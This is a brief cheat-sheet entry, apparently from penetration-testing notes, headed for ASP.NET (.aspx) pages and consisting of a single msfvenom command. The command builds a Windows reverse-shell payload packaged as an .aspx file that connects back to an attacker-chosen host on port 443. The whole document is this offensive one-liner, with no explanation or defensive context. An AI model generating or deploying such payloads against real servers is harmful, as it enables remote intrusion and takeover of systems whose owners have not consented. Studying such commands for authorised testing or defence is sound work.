## Active Sever Pages Extended (.aspx)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev_shell.aspx
```

